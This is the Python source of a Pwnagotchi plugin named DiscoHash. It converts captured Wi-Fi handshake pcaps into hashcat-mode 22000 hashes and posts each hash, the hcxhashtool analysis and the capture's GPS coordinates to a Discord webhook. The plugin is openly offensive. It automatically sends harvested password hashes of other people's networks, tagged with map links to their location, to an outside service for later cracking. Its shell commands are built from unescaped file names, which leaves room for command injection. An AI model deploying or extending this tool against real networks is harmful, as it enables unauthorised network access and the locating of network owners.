from datetime import datetime
from threading import Lock
from pwnagotchi.utils import StatusFile
import pwnagotchi.plugins as plugins
from json.decoder import JSONDecodeError
import os
import json
import logging
import requests
import subprocess
import pwnagotchi

class DiscoHash(plugins.Plugin):
    __author__ = 'v0yager'
    __changed__ = 'Kilg00re'
    __version__ = '1.2.0'
    __license__ = 'GPL3'
    __description__ = '''
                DiscoHash extracts hashes from pcaps (hashcat mode 22000) using hcxpcapngtool,
                analyses the hash using hcxhashtool and posts the output to Discord along with 
                any obtained GPS coordinates.
                '''
    
    def __init__(self):
        self.ready = False
        self.lock = Lock()
        try:
            self.report = StatusFile('/root/.discohash_uploads', data_format='json')
        except JSONDecodeError:
            os.remove("/root/.discohash_uploads")
            self.report = StatusFile('/root/.discohash_uploads', data_format='json')
        self.options = dict()
        self.skip = list()
    
    def on_loaded(self):
        if 'webhook_url' not in self.options or ('webhook_url' in self.options and not self.options['webhook_url']):
            logging.error("DiscoHash Can't run without Discord webhook url.")
            return
    
        self.ready = True
        logging.info("DiscoHash: plugin loaded")
    
    def on_internet_available(self, agent):
        global lat
        global lon
        global loc_url
        global tether
        tether = True
        if not self.ready or self.lock.locked():
            return
    
        with self.lock:
            config = agent.config()
            display = agent.view()
            fingerprint = agent.fingerprint()
            reported = self.report.data_field_or('reported', default=list())
            handshake_dir = config['bettercap']['handshakes']
            handshake_filenames = os.listdir(handshake_dir)
            hashes_files = [os.path.join(handshake_dir, filename) for filename in handshake_filenames if
                               filename.endswith('.22000')]
            
            new_hash_files = set(hashes_files) - set(reported)
            if new_hash_files:
                logging.info("DiscoHash: Internet connectivity detected. Uploading new handshakes to Discord")
                for idx, hashfile in enumerate(new_hash_files):
                    display.on_uploading(f"Discord ({idx + 1}/{len(new_hash_files)})")
                    try:
                        hash_val = open(hashfile, 'r')
                        hash_data = hash_val.read()
                        hash_val.close()
                        analysis = subprocess.getoutput('hcxhashtool -i {}.22000 --info=stdout'.format(hashfile.split('.')[0]))
                    except Exception as e:
                        logging.error('DiscoHash: An error occured while analysing the hash: {}'.format(e))
                        continue

                    try:
                        lat, lon, loc_url= self.get_coord(hashfile.split('.')[0])
                        data = {
                            'embeds': [
                                {
                                'title': '(ᵔ◡◡ᵔ) {} sniffed a new hash!'.format(pwnagotchi.name()), 
                                'color': 289968,
                                'url': 'https://pwnagotchi.ai/pwnfile/#!{}'.format(fingerprint),
                                'description': '__**Hash Information**__',
                                'fields': [
                                    {
                                        'name': 'Hash:',
                                        'value': '`{}`'.format(hash_data),
                                        'inline': False
                                    },
                                    {
                                        'name': 'Hash Analysis:',
                                        'value': '```{}```'.format(analysis),
                                        'inline': False
                                    },
                                    {
                                        'name': '__**Location Information**__',
                                        'value': '[GPS Waypoint]({})'.format(loc_url),
                                        'inline': False
                                    },
                                    {
                                        'name': 'Raw Coordinates:',
                                        'value': '```{},{}```'.format(lat,lon),
                                        'inline': False
                                    },
                                ],
                                'footer': {
                                    'text': 'Pwnagotchi v1.7.5 - DiscoHash Plugin v{}'.format(self.__version__)
                                }
                                }
                            ]
                        }
                        reported.append(hashfile)
                        self.report.update(data={'reported': reported})
                        requests.post(self.options['webhook_url'], files={'payload_json': (None, json.dumps(data))})
                        logging.debug('[*] DiscoHash: Webhook sent!')
                    except Exception as e:
                        logging.warning('[!] DiscoHash: An error occured with the plugin!{}'.format(e))

    
    def on_epoch(self, agent, epoch, epoch_data):
        config = agent.config()
        handshake_dir = config['bettercap']['handshakes']
        self.process_pcaps(handshake_dir)
    

    def process_pcaps(self, handshake_dir):
        handshakes_list = [os.path.join(handshake_dir, filename) for filename in os.listdir(handshake_dir) if filename.endswith('.pcap')]
        failed_jobs = []
        successful_jobs = []
        lonely_pcaps = []
        for num, handshake in enumerate(handshakes_list):
            fullpathNoExt = handshake.split('.')[0]
            pcapFileName = handshake.split('/')[-1:][0]
            if not os.path.isfile(fullpathNoExt + '.22000'):
                if self.write_hash(handshake):
                    successful_jobs.append('22000: ' + pcapFileName)
                else:
                    failed_jobs.append('22000: ' + pcapFileName)
                    if not os.path.isfile(fullpathNoExt + '.22000'): 
                        lonely_pcaps.append(handshake)
                        logging.debug('[*] DiscoHash Batch job: added {} to lonely list'.format(pcapFileName))
            if ((num + 1) % 10 == 0) or (num + 1 == len(handshakes_list)):
                logging.debug('[*] DiscoHash Batch job: {}/{} done ({} fails)'.format(num + 1,len(handshakes_list),len(lonely_pcaps)))
        if successful_jobs:
            logging.debug('[*] DiscoHash Batch job: {} new handshake files created'.format(len(successful_jobs)))
        if lonely_pcaps:
            logging.debug('[*] DiscoHash Batch job: {} networks without enough packets to create a hash'.format(len(lonely_pcaps)))
    

    def write_hash(self, handshake):
        fullpathNoExt = handshake.split('.')[0]
        filename = handshake.split('/')[-1:][0].split('.')[0]
        _ = subprocess.getoutput('hcxpcapngtool -o {}.22000 {} >/dev/null 2>&1'.format(fullpathNoExt,handshake))
        if os.path.isfile(fullpathNoExt +  '.22000'):
            logging.info('[+] DiscoHash EAPOL/PMKID Success: {}.22000 created'.format(filename))                
            return True
        else:
            return False
    
    def get_coord(self, fullpathNoExt):
        try:
            if os.path.isfile(fullpathNoExt + '.gps.json'):
                read_gps = open(f'{fullpathNoExt}.gps.json', 'r')
                gps_bytes = read_gps.read()
                raw_gps = json.loads(gps_bytes)
                lat = json.dumps(raw_gps['Latitude'])
                lon = json.dumps(raw_gps['Longitude'])
                loc_url = "https://www.google.com/maps/search/?api=1&query={},{}".format(lat, lon)
            else:
                read_gps = open(f'{fullpathNoExt}.geo.json', 'r')
                gps_bytes = read_gps.read()
                raw_gps = json.loads(gps_bytes)
                lat = json.dumps(raw_gps['location']['lat'])
                lon = json.dumps(raw_gps['location']['lng'])
                loc_url = "https://www.google.com/maps/search/?api=1&query={},{}".format(lat, lon)
        except:
            lat = "NULL"
            lon = "NULL"
            loc_url = "https://www.youtube.com/watch?v=gkTb9GP9lVI"
        finally:
            return lat, lon, loc_url
